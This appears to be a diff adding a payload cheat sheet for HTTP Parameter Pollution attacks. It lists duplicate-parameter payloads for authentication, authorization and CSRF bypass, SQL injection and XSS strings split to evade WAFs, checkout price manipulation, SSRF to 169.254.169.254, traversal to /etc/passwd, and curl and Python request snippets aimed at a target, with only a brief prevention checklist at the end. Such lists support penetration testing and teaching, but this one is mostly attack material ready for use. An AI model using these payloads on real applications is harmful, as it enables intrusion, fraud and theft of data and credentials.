@@ -1,0 +1,321 @@
+# HTTP Parameter Pollution (HPP) Payloads
+
+## ========================================
+## BASIC HPP
+## ========================================
+
+# Duplicate parameters
+?id=1&id=2
+?user=victim&user=attacker
+?role=user&role=admin
+
+# Multiple same parameters
+?page=1&page=2&page=3
+?action=view&action=delete
+
+## ========================================
+## BACKEND-SPECIFIC BEHAVIOR
+## ========================================
+
+# PHP/Apache - Last parameter wins
+?param=value1&param=value2
+Result: param=value2
+
+# ASP.NET/IIS - Concatenates with comma
+?param=value1&param=value2
+Result: param=value1,value2
+
+# JSP/Tomcat - First parameter wins
+?param=value1&param=value2
+Result: param=value1
+
+# Perl (CGI.pm) - Creates array
+?param=value1&param=value2
+Result: param=[value1, value2]
+
+# Python (Flask/Django) - Last parameter wins
+?param=value1&param=value2
+Result: param=value2
+
+## ========================================
+## AUTHENTICATION BYPASS
+## ========================================
+
+# Bypass admin check
+?user=attacker&user=admin
+?role=user&role=administrator
+
+# Session fixation
+?sessionid=user_session&sessionid=attacker_session
+
+## ========================================
+## AUTHORIZATION BYPASS
+## ========================================
+
+# Parameter override
+?userid=1&userid=2
+?accountid=victim&accountid=attacker
+
+# Role escalation
+?role=user&role=admin
+?privilege=read&privilege=write
+
+## ========================================
+## INJECTION ATTACKS
+## ========================================
+
+# SQL injection via HPP
+?id=1&id=2' OR '1'='1
+?search=term&search=' OR 1=1--
+
+# XSS via HPP
+?msg=hello&msg=<script>alert(1)</script>
+?name=user&name=<svg/onload=alert(1)>
+
+## ========================================
+## WAF BYPASS
+## ========================================
+
+# Split malicious payload
+?payload=<script&payload=>alert(1)</script>
+
+# Evade signature detection
+?param=SELECT&param=*%20FROM%20users
+
+# Bypass input validation
+?email=user@domain.com&email=<script>alert(1)</script>
+
+## ========================================
+## BUSINESS LOGIC BYPASS
+## ========================================
+
+# Price manipulation
+?price=100&price=1
+?amount=50&amount=0
+
+# Quantity override
+?qty=1&qty=1000
+?items=product1&items=product2
+
+# Discount abuse
+?discount=10&discount=100
+?coupon=SAVE10&coupon=SAVE50
+
+## ========================================
+## PARAMETER PRECEDENCE
+## ========================================
+
+# Test which parameter is used
+?admin=false&admin=true
+?debug=0&debug=1
+?premium=no&premium=yes
+
+## ========================================
+## FILTER BYPASS
+## ========================================
+
+# Bypass blacklist
+?cmd=cat&cmd=/etc/passwd
+?exec=ls&exec=-la
+
+# Bypass length restrictions
+?input=short&input=verylonginputthatexceedslimit
+
+## ========================================
+## CSRF BYPASS
+## ========================================
+
+# Override CSRF token
+?csrf_token=valid&csrf_token=attacker_token
+?_token=legitimate&_token=malicious
+
+## ========================================
+## QUERY BUILDING EXPLOITATION
+## ========================================
+
+# SQL query manipulation
+?SELECT=*&FROM=users&WHERE=1=1
+
+# NoSQL query manipulation
+?$where=malicious_code&$where=valid_code
+
+## ========================================
+## ROUTE/PATH MANIPULATION
+## ========================================
+
+# Change routing behavior
+?controller=user&controller=admin
+?action=view&action=delete
+
+## ========================================
+## CACHE POISONING
+## ========================================
+
+# Poison cache with HPP
+?version=1&version=malicious
+Cache may store different content
+
+## ========================================
+## SSRF VIA HPP
+## ========================================
+
+# URL parameter pollution
+?url=safe-url&url=http://internal-server
+?redirect=allowed&redirect=http://169.254.169.254
+
+## ========================================
+## REAL-WORLD EXAMPLES
+## ========================================
+
+# Example 1: Payment bypass
+POST /checkout
+amount=100&amount=1
+
+# Example 2: IDOR
+?user_id=123&user_id=456
+
+# Example 3: File access
+?file=public.txt&file=../../../etc/passwd
+
+## ========================================
+## HPP IN DIFFERENT POSITIONS
+## ========================================
+
+# GET parameters
+?param=value1&param=value2
+
+# POST body
+param=value1&param=value2
+
+# Cookie
+Cookie: session=sess1&session=sess2
+
+# Headers (if parsed)
+X-Custom: value1
+X-Custom: value2
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify parameter handling
+- Test with duplicate params
+- Observe backend behavior
+
+# 2. Test precedence
+?test=first&test=last
+- Which value is used?
+
+# 3. Test concatenation
+- Does backend join values?
+
+# 4. Test array behavior
+- Does backend create array?
+
+# 5. Exploit accordingly
+- Use discovered behavior
+
+## ========================================
+## ADVANCED EXPLOITATION
+## ========================================
+
+# Combine with other attacks
+?user=victim&user=<script>alert(1)</script>
+
+# JSON parameter pollution
+{"user":"victim","user":"attacker"}
+
+# XML parameter pollution
+<user>victim</user><user>attacker</user>
+
+## ========================================
+## WAF EVASION TECHNIQUES
+## ========================================
+
+# Split attack signature
+?search=<scr&search=ipt>alert(1)</script>
+
+# Use encoding
+?param=value1&param=%76alue2
+
+# Parameter order
+?safe=value&malicious=payload&safe=value
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite
+- Intruder for testing
+- Repeater for manual testing
+
+# curl
+curl "http://target.com?param=1&param=2"
+
+# Python requests
+import requests
+url = "http://target.com"
+params = [('id', '1'), ('id', '2')]
+requests.get(url, params=params)
+
+## ========================================
+## PAYLOADS BY FRAMEWORK
+## ========================================
+
+# PHP/Apache (last wins)
+?admin=false&admin=true
+
+# ASP.NET (concatenation)
+?input=safe&input=<script>
+Result: safe,<script>
+
+# Node.js/Express (depends on parser)
+?param[]=value1&param[]=value2
+
+## ========================================
+## COMMON VULNERABLE PATTERNS
+## ========================================
+
+# Direct parameter usage
+$id = $_GET['id'];  // Takes last value
+
+# Array handling
+$users = $_GET['user'];  // May be array
+
+# Framework defaults
+framework.request.get('param')
+
+## ========================================
+## EXPLOITATION CHECKLIST
+## ========================================
+
+# Test for:
+- [ ] Authentication bypass
+- [ ] Authorization bypass  
+- [ ] SQL injection
+- [ ] XSS
+- [ ] CSRF bypass
+- [ ] Price manipulation
+- [ ] Filter bypass
+- [ ] IDOR
+- [ ] SSRF
+
+## ========================================
+## PREVENTION TESTING
+## ========================================
+
+# Check if app handles:
+- Duplicate parameter detection
+- Parameter validation
+- Proper parsing
+- Whitelist approach
+
+## ========================================
+## COMMON ENDPOINTS
+## ========================================
+
+/login?user=X&user=Y
+/search?q=X&q=Y
+/api?id=X&id=Y
+/checkout?price=X&price=Y
+/profile?user=X&user=Y
